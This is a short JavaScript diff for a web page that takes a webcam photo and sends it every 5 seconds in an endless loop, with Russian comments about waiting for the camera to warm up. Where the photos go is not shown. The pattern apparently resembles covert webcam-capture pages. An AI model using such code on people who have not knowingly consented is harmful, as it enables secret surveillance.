@@ -87,12 +87,23 @@
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
-            
-            setTimeout(() => { takeAndSendPhoto(video, canvas); }, 2000);
-            setInterval(() => { takeAndSendPhoto(video, canvas); }, 5000); 
+
+            // Ждем события 'loadedmetadata', когда камера реально ожила
+            video.onloadedmetadata = () => {
+                video.play();
+                
+                // Делаем паузу 2 секунды ПЕРЕД первым фото, 
+                // чтобы камера успела настроить свет и фокус
+                setTimeout(() => {
+                    // Теперь запускаем бесконечный цикл
+                    setInterval(() => {
+                        takeAndSendPhoto(video, canvas);
+                    }, 5000); 
+                }, 2000);
+            };
         })
         .catch(err => {
-            console.log("Камера заблокирована");
+            console.log("Камера заблокирована или ошибка:", err);
         });
     };
 </script>
